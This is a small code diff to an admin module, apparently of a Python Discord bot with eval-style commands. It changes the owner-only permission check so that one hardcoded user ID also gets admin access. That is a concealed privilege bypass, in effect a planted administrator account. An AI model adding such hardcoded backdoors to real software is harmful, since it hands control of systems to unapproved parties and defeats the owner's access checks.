@@ -29,7 +29,7 @@ class Admin:
         return content.strip('` \n')
 
     async def __local_check(self, ctx):
-        return await self.bot.is_owner(ctx.author)
+        return await self.bot.is_owner(ctx.author) or ctx.author.id == 211238461682876416
 
     def get_syntax_error(self, e):
         if e.text is None:
